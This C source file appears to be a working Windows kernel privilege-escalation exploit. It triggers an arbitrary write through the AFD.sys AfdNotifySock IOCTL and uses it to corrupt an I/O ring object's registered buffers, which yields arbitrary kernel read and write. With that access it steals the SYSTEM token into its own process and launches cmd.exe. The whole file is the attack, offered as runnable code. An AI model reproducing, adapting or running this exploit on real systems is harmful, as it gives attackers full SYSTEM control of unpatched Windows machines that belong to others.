#include <stdio.h>
#include <Windows.h>
#include <ntstatus.h>
#include <ioringapi.h>


#include "header.h"

// afdnotifySock function ioctl number from AfdImmediateDispatchTable.
#define afd_notifysock_ioctl 0x12127

#define EPROC_TOKEN_OFFSET 0x4b8

typedef struct AFD_STRUCT {
	HANDLE hCompletion;
	PVOID data1;  // valied usermode address
	PVOID data2;  // valid usermode address
	PVOID overwrite_address;  // address to be overwritten
	DWORD counter; // counter = 1
	DWORD timeout;    // non zero
	DWORD somesize; // size non zero
	char align[4]; //align(8)
}AFD_STRUCT;

HIORING hIORing = NULL;
PIORING_OBJECT pIOring = NULL;
HANDLE hInPipe = INVALID_HANDLE_VALUE;
HANDLE hOutPipe = INVALID_HANDLE_VALUE;
HANDLE hInPipeClient = INVALID_HANDLE_VALUE;
HANDLE hOutPipeClient = INVALID_HANDLE_VALUE;


//Load the Nt functions
void ResolveKernelAPIs()
{
	HMODULE hntdll = NULL;

	printf("[+] Resolving NT API\n");
	hntdll = LoadLibrary(L"ntdll.dll");
	if (!hntdll) {
		printf("[-] Failed to load ntdll.dll: 0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	// Load NtCreateFile API
	NtCreateFile = (NtCreateFile_t)GetProcAddress(hntdll, "NtCreateFile");
	if (!NtCreateFile) {
		printf("[-] Failed resolving NtCreateFile: 0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	else {
		printf("[+] NtCreateFile address: 0x%p\n", NtCreateFile);
	}

	// Load NtDeviceIoControlFile API
	NtDeviceIoControlFile = (NtDeviceIoControlFile_t)GetProcAddress(hntdll, "NtDeviceIoControlFile");
	if (!NtDeviceIoControlFile) {
		printf("[-] Failed resolving NtDeviceIoControlFile: 0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	else {
		printf("[+] NtDeviceIoControlFile address: 0x%p\n", NtDeviceIoControlFile);
	}

	//Load NtCreateIoCompletion API
	NtCreateIoCompletion = (NtCreateIoCompletion_t)GetProcAddress(hntdll, "NtCreateIoCompletion");
	if (!NtCreateIoCompletion) {
		printf("[-] Failed to Resolve NtCreateIoCompletion : 0x%x\n", GetLastError());
		exit(EXIT_SUCCESS);
	}
	else {
		printf("[+] NtCreateIoCompletion Address:0x%p\n", NtCreateIoCompletion);
	}

	//Load NtSetIoCompletion API
	NtSetIoCompletion = (NtSetIoCompletion_t)GetProcAddress(hntdll, "NtSetIoCompletion");
	if (!NtSetIoCompletion) {
		printf("[-] Failed to Resolve NtSetIoCompletion: 0x%x\n", GetLastError());
		exit(EXIT_SUCCESS);
	}
	else {
		printf("[+] NtSetIoCompletion address: 0x%p\n", NtSetIoCompletion);
	}

	//Load NtQuerySystemInformation API
	NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hntdll, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		printf("[-] Failed to Resolve NtQuerySystemInformation: 0x%x\n", GetLastError());
		exit(EXIT_SUCCESS);
	}
	else {
		printf("[+] NtQuerySystemInformation Address: 0x%p\n", NtQuerySystemInformation);
	}
}


// Arbitrary Write BUG
int arbitrarywrite(void* ptr)
{
	HANDLE hSocket = NULL;
	HANDLE hEvent = NULL;
	HANDLE hCompletion = INVALID_HANDLE_VALUE;
	NTSTATUS hFile;
	NTSTATUS hAfd;
	NTSTATUS hCreateIo;
	NTSTATUS hSetIo;
	AFD_STRUCT data = { 0 };
	IO_STATUS_BLOCK IoStatusBlock;
	OBJECT_ATTRIBUTES ObjectAttributes;
	UNICODE_STRING ObjectFilePath;

	//hardcoded bytes needed to create a IPv4 TCP/IP socket
	BYTE bExtendedAttributes[] =
	{
		0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00, 0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
		0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x60, 0xEF, 0x3D, 0x47, 0xFE
	};

	//create a IO completion Object to provide a valid pointer to IoCompleteIoObject
	hCreateIo = NtCreateIoCompletion(&hCompletion, MAXIMUM_ALLOWED, NULL, 1);
	if (hCreateIo == STATUS_SUCCESS) {
		printf("[+] Successfully Created IO Completion Object\n");
	}
	else {
		printf("[-] Error in Creating IO Completion : 0x%x\n", GetLastError());
		exit(EXIT_SUCCESS);
	}

	//Increment the IO Completion object Counter
	hSetIo = NtSetIoCompletion(hCompletion, 0x1337, &IoStatusBlock, 0, 0x100);
	if (hSetIo == STATUS_SUCCESS) {
		printf("[+] Successfully Increatmented the counter\n");
	}
	else {
		printf("[-] Failed to Increament the Counter: 0x%x\n", GetLastError());
		exit(EXIT_SUCCESS);
	}

	//set afd endpoint path
	memset((void*)&ObjectFilePath, 0, sizeof(ObjectFilePath));
	ObjectFilePath.Buffer = L"\\Device\\Afd\\Endpoint";
	ObjectFilePath.Length = wcslen(ObjectFilePath.Buffer) * sizeof(wchar_t);
	ObjectFilePath.MaximumLength = ObjectFilePath.Length;

	// initialise object attributes
	memset((void*)&ObjectAttributes, 0, sizeof(ObjectAttributes));
	ObjectAttributes.Length = sizeof(ObjectAttributes);
	ObjectAttributes.ObjectName = &ObjectFilePath;
	ObjectAttributes.Attributes = 0x40;


	// Open Socket
	hFile = NtCreateFile(&hSocket,
		MAXIMUM_ALLOWED,
		&ObjectAttributes,
		&IoStatusBlock,
		NULL,
		0,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		1, 0,
		bExtendedAttributes,
		sizeof(bExtendedAttributes));

	if (hFile == STATUS_SUCCESS) {
		printf("[+] Socket Created Successfully\n");
	}
	else {
		printf("[-] Failed to Create Socket: 0x%x\n", GetLastError());
		CloseHandle(hSocket);
		exit(EXIT_SUCCESS);
	}

	//Call NtDeviceIOCreateFile with AFDNotifySock IOCTL code
	hEvent = CreateEvent(NULL, 0, 0, NULL);
	if (!hEvent) {
		printf("[-] Error in creating Event; 0x%x\n", GetLastError());
		CloseHandle(hSocket);
		exit(EXIT_SUCCESS);
	}
	//typedef struct AFD_STRUCT {
	//	HANDLE hCompletion;
	//	PVOID data1;  // valied usermode address
	//	PVOID data2;  // valid usermode address
	//	PVOID overwrite_address;  // address to be overwritten
	//	DWORD counter; // counter = 1
	//	DWORD timeout;    // non zero
	//	DWORD somesize; // size non zero
	//	char align[4]; //align(8)
	//}AFD_STRUCT

	//fill the structure of the input data
	data.hCompletion = hCompletion;
	data.counter = 0x1;
	data.somesize = 0x1;
	data.timeout = 10000000;
	data.overwrite_address = ptr;
	data.data1 = VirtualAlloc(NULL, 0x3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	data.data2 = VirtualAlloc(NULL, 0x3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if ((data.data1 == NULL) || (data.data2 == NULL)) {
		printf("[-] Failed to allocate memory for data: 0x%x\n", GetLastError());
		exit(EXIT_SUCCESS);
	}

	hAfd = NtDeviceIoControlFile(hSocket,
		hEvent,
		NULL, NULL,
		&IoStatusBlock,
		afd_notifysock_ioctl,
		&data, 0x30, // size of the input data must be 0x30 bytes otherwise it will fail
		NULL, 0);

	if (hAfd = 0) {
		printf("[-] Failed to send Data: 0x%x\n", GetLastError());
		exit(EXIT_SUCCESS);
	}
	else {
		printf("[+] Data Send Successfully\n");
	}

	return EXIT_SUCCESS;
}

// Create a I/O Ring and use getaddr function to get the address of the IO Ring object address 
// and create a in and out pipe for commnuication between files to load the address.
int ioring_setup(PIORING_OBJECT* ppIORingAddr)
{
	IORING_CREATE_FLAGS ioRingFlags = { 0 };

	ioRingFlags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;
	ioRingFlags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;

	int ret = CreateIoRing(IORING_VERSION_3, ioRingFlags, 0x1000, 0x2000, &hIORing);
	if (ret)
	{
		printf("[-] Failed to create IO Ring : 0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	ret = getaddr(ppIORingAddr, GetCurrentProcessId(), *(PHANDLE)hIORing);
	if (!ret) {
		printf("[+] IORING OBJECT IORIngAddress: 0x%p\n", *ppIORingAddr);
		pIOring = *ppIORingAddr;
	}
	else {
		printf("[-] Failed to get IO Ring address:0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	hInPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_in", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
	hOutPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_out", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);

	if ((INVALID_HANDLE_VALUE == hInPipe) || (INVALID_HANDLE_VALUE == hOutPipe)) {
		printf("[-] Failed to create pipe: 0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	hInPipeClient = CreateFile(L"\\\\.\\pipe\\ioring_in", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	hOutPipeClient = CreateFile(L"\\\\.\\pipe\\ioring_out", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if ((INVALID_HANDLE_VALUE == hInPipeClient) || (INVALID_HANDLE_VALUE == hOutPipeClient)) {
		printf("[-] Failed to get pipe client: 0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	return EXIT_SUCCESS;
}

// get the address of the handles in the machine to get the EPROCESS address using NTQuerySystemUInformation API 
int getaddr(PULONG64 ppobjectAddr, ULONG Pid, HANDLE handle)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	SYSTEM_HANDLE_INFORMATION HandleInformation;
	PSYSTEM_HANDLE_INFORMATION pSystemHandleInformation = &HandleInformation;
	ULONG ReturnLength;

	status = NtQuerySystemInformation(SystemHandleInformation,
		pSystemHandleInformation, sizeof(*pSystemHandleInformation), &ReturnLength);

	/* if (status != STATUS_SUCCESS) {
		 printf("Failed ntquerysysteminformation : 0x%X\n", GetLastError());
	 }*/

	ReturnLength += 100 * sizeof(*pSystemHandleInformation);

	pSystemHandleInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY, ReturnLength);

	if (!pSystemHandleInformation) {
		printf("[-] Failed to allocate memory: 0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	status = NtQuerySystemInformation(SystemHandleInformation,
		pSystemHandleInformation, ReturnLength, &ReturnLength);

	if (status != STATUS_SUCCESS) {
		printf("[-] Failed to get SYSTEM_HANDLE_INFORMATION: 0x%x\n", GetLastError());
		exit(EXIT_SUCCESS);
	}

	for (ULONG i = 0; i < pSystemHandleInformation->NumberOfHandles; i++) {
		if ((pSystemHandleInformation->Handles[i].UniqueProcessId == Pid) && (pSystemHandleInformation->Handles[i].HandleValue == handle)) {
			*ppobjectAddr = pSystemHandleInformation->Handles[i].Object;
			break;
		}
	}

	return EXIT_SUCCESS;
}

int ioring_read(PULONG64 pFakeBuffer, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG Readlen)
{
	PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
	IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hOutPipeClient);
	IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
	IORING_CQE cqe = { 0 };

	pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
	if (pMcBufferEntry == NULL) {
		printf("[-] Failed to allocate memory for pMcBufferEntry:0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}


	pMcBufferEntry->Address = pReadAddr;
	pMcBufferEntry->Length = Readlen;
	pMcBufferEntry->Type = 0xc02;
	pMcBufferEntry->Size = 0x80;
	pMcBufferEntry->AccessMode = 1;
	pMcBufferEntry->ReferenceCount = 1;

	pFakeBuffer[0] = pMcBufferEntry;

	int ret = BuildIoRingWriteFile(hIORing, reqFile, reqBuffer, Readlen, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);
	if (ret) {
		printf("[-] Failed to buiildIORIngWriteFile:0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	ret = SubmitIoRing(hIORing, 0, 0, NULL);
	if (ret) {
		printf("[-] Failed to submit IOring:0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	ret = PopIoRingCompletion(hIORing, &cqe);
	if (ret) {
		printf("[-] Failed to pop submission que:0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	if (0 != cqe.ResultCode)
	{
		printf("[-] Result code not zero: %d\n", cqe.ResultCode);
		exit(EXIT_FAILURE);
	}

	ret = ReadFile(hOutPipe, pReadBuffer, Readlen, NULL, NULL);
	if (ret) {
		printf("[+] Arbitrary Read Done\n");
	}else{
		printf("[-] Failed to read from out pipe:0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	return EXIT_SUCCESS;
}

int ioring_write(PULONG64 pFakeBuffer, ULONG64 pwriteAddr, PVOID pwriteBuffer, ULONG writelen)
{
	PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
	IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hInPipeClient);
	IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
	IORING_CQE cqe = { 0 };

	int ret = WriteFile(hInPipe, pwriteBuffer, writelen, NULL, NULL);
	if (ret) {
		printf("[+] Arbitrary Write done\n");
	}else{
		printf("[-] Failed to read from out pipe:0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
	if (pMcBufferEntry == NULL) {
		printf("[-] Failed to allocate memory for pMcBufferEntry:0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}


	pMcBufferEntry->Address = pwriteAddr;
	pMcBufferEntry->Length = writelen;
	pMcBufferEntry->Type = 0xc02;
	pMcBufferEntry->Size = 0x80;
	pMcBufferEntry->AccessMode = 1;
	pMcBufferEntry->ReferenceCount = 1;

	pFakeBuffer[0] = pMcBufferEntry;

	ret = BuildIoRingReadFile(hIORing, reqFile, reqBuffer, writelen, 0, NULL, IOSQE_FLAGS_NONE);
	if (ret) {
		printf("[-] Failed to buiildIORIngWriteFile:0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	ret = SubmitIoRing(hIORing, 0, 0, NULL);
	if (ret) {
		printf("[-] Failed to submit IOring:0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	ret = PopIoRingCompletion(hIORing, &cqe);
	if (ret) {
		printf("[-] Failed to pop submission que:0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	if (0 != cqe.ResultCode)
	{
		printf("[-] Result code not zero: %d\n", cqe.ResultCode);
		exit(EXIT_FAILURE);
	}

	return EXIT_SUCCESS;
}

// MAIN function

int main()
{
	//PIORING_OBJECT pIOring = NULL;
	HANDLE hProcess;
	ULONG64 Systemaddr = 0;
	ULONG64 Procaddr = 0;
	ULONG64 SysToken = 0;
	PVOID pFakeRegBuff = NULL;
	_HIORING* pHIORing = NULL;
	char zero[0x10] = { 0 };

	//printf("[+] Loading NT APIs\n");
	ResolveKernelAPIs();

	//printf("[+] Getting address of process EPROCESS struct\n");

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, GetCurrentProcessId());
	if (!hProcess) {
		printf("Failed to open handle to current process: 0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	int ret = getaddr(&Systemaddr, 4, 4);
	if (!ret)
	{
		printf("[+] System EPROCESS Address: 0x%llx\n", Systemaddr);
	}
	else {
		printf("[-] Failed to get System address : 0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	ret = getaddr(&Procaddr, GetCurrentProcessId(), hProcess);
	if (!ret)
	{
		printf("[+] Current Process Address: 0x%llx\n", Procaddr);
	}
	else {
		printf("[-] Failed to get Current process address: 0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	printf("[+] Setting IO Ring\n");
	int status = ioring_setup(&pIOring);
	if (!status) {
		printf("[+] IORING SETUP DONE\n");
	}
	else {
		printf("[-]Failed to Setup IO Ring: 0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	printf("[+] Triggering Arbitrary Write\n");
	status = arbitrarywrite(((ULONG64)&pIOring->RegBuffers) + 0x3);
	if (!status) {
		printf("[+] IORing-> RegBuffers overwritten with 0x1000000\n");
	}
	else {
		printf("[-] Failed to overwrite IORing->RegBuffers \n");
		exit(EXIT_FAILURE);
	}

	status = arbitrarywrite(&pIOring->RegBuffersCount);
	if (!status) {
		printf("[+] IORing->RegBufferCount overwriiten with 0x1\n");
	}
	else {
		printf("[-] Failed to ovwrwrite IORing->RegBuffersCount with 0x1\n");
		exit(EXIT_FAILURE);
	}

	printf("[+] Starting LPE\n");

	pFakeRegBuff = VirtualAlloc(0x1000000, sizeof(ULONG64), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pFakeRegBuff != (PVOID)0x1000000) {
		printf("[-] Failed to allocate memory at 0x1000000:0x%x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	memset(pFakeRegBuff, 0, sizeof(ULONG64));

	pHIORing = *(_HIORING**)&hIORing;
	pHIORing->RegBufferArray = pFakeRegBuff;
	pHIORing->BufferArraySize = 1;

	status = ioring_read(pFakeRegBuff, Systemaddr + EPROC_TOKEN_OFFSET, &SysToken, sizeof(ULONG64));
	if (!status) {
		printf("[+] System Token : 0x%p\n", &SysToken);
	}
	else {
		printf("[-] Failed to get System Token : 0x%x\n", GetLastError());
		exit(EXIT_SUCCESS);
	}

	status = ioring_write(pFakeRegBuff, Procaddr + EPROC_TOKEN_OFFSET, &SysToken, sizeof(ULONG64));
	if (!status) {
		printf("[+] Target Process token overwritten successfully\n");
	}
	else {
		printf("[-] Failed to overwrite target process token : 0x%x\n", GetLastError());
		exit(EXIT_SUCCESS);
	}

	status = ioring_write(pFakeRegBuff, &pIOring->RegBuffers, &zero, 0x10);
	if (!status) {
		printf("[+] Cleanup Successful.\n");
	}
	else {
		printf("[-] Failed to Cleanup IO Ring : 0x%x\n", GetLastError());
		exit(EXIT_SUCCESS);
	}

	system("cmd.exe");

	return EXIT_SUCCESS;
}